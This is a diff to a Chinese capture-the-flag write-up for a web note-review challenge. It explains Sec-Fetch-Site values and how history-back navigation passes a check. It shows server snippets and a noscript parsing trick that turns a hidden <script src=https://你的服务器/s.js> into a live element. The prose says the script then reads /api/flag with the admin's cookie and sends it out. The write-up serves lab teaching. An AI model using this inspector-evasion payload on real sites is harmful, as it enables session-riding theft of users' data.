@@ -974,7 +974,7 @@ setTimeout(() => opener.history.back(), 500);
 | `same-origin` / `same-site` / `cross-site` | 请求有"发起页面"，按发起页面与目标的站点关系取对应值 | 页面脚本发起的跳转、表单提交、`fetch`、点击链接等 |
 | `none` | 请求没有"发起页面"，由浏览器本身发起 | 地址栏输入、点击书签、外部程序打开，以及**历史回退/前进**产生的重新请求 |
 
-对照检查 4 的要求（`Sec-Fetch-Site: none` 且 `Sec-Fetch-Dest: document`）：请求必须是一次"由浏览器发起的顶层文档导航"。脚本能做出的所有跳转都不满足；**历史回退可以**。
+对照检查 4 的要求（`Sec-Fetch-Site: none` 且 `Sec-Fetch-Dest: document`）：请求必须是一次"由浏览器发起的顶层文档导航"。脚本能做出的所有跳转都不满足（`window.open` 新窗口、脚本改 `location`、`location.reload()` 都是顶层文档导航，但发起者是页面脚本，带的是 `cross-site` 或 `same-origin` 之类的值）；**历史回退可以**（回退没有发起页面）。取值取决于**这一次导航**的发起者，与请求哪个网址无关：同一个入口网址，刷新带 `same-origin`，回退带 `none`。
 
 #### 2.8.3 至此八项检查的状态
 
@@ -995,7 +995,46 @@ setTimeout(() => opener.history.back(), 500);
 
 > 一句话说明：审查页输出的笔记原文会在挑战域（`http://localhost:3000`）顶层被浏览器渲染，`s.js` 因此再执行一次，这次它执行的是另一个分支（读 flag 的那支）：不做端口转交，直接以同源身份请求 `/api/flag`（管理员 cookie 随请求自动携带），把响应内容发送到你自己的服务器。
 
-`s.js` 的完整正式版本（两个分支）：
+**整条链路（笔记原文 → `s.js` 执行）**
+
+**① 笔记原文是创建时存下的**（2.2.1 的 `/create`：检查器关 JS、断网，通过后入库）：
+
+```javascript
+if (!(await inspectDocument(html))) {                            // 检查器不放行 → 400
+  res.status(400).render("message", { title: "Bad note", message: "Document profile rejected." });
+  return;
+}
+
+const id = randomId(10);
+notes.set(id, {
+  id,
+  title,
+  html,                                                          // 笔记原文
+  createdAt: Date.now(),
+});
+```
+
+**② 第二次访问通过检查后，渲染分支把原文取出、原样发给浏览器**（2.5.2 的 `/reports/check`）：
+
+```javascript
+const note = notes.get(currentReview.noteId);                    // 取出笔记原文
+
+if (!policy(req) || !consumeReport(req)) { /* 403 forbidden */ } // 检查 4-8 不满足就拒绝
+res.type("html").send(note.html);                                // 通过：原文作为响应正文发出；没有 CSP 头
+```
+
+**③ 浏览器把原文当真实文档解析（JS 开着）**，原文里触发加载的是这一行：
+
+```html
+<script src=https://你的服务器/s.js></script>
+<!-- 检查器那次（JS 关）：这行在 <a alt=" 的引号里，只是属性值里的文字，不加载（检查器看到的是空白文档） -->
+<!-- 这次渲染（JS 开）：noscript 内容按原文处理，第一个 </noscript> 落在 alt 引号里 → noscript 提前闭合；
+     原本藏在引号里的 <script src=...> 成为真实元素（逐字符推演见 2.6.3） -->
+<!-- 外链脚本解析阻塞：成为真实元素的同一刻，浏览器就到你服务器请求 /s.js（跨源加载不受同源策略限制） -->
+<!-- 拦它的关卡都不在：响应没有 CSP 头；笔记自带的 meta CSP 排在文档最末尾，解析到它时脚本已经跑完 -->
+```
+
+**④ `s.js` 下载回来立即执行**（完整代码，两个分支）：
 
 ```javascript
 const q = new URLSearchParams(location.search);
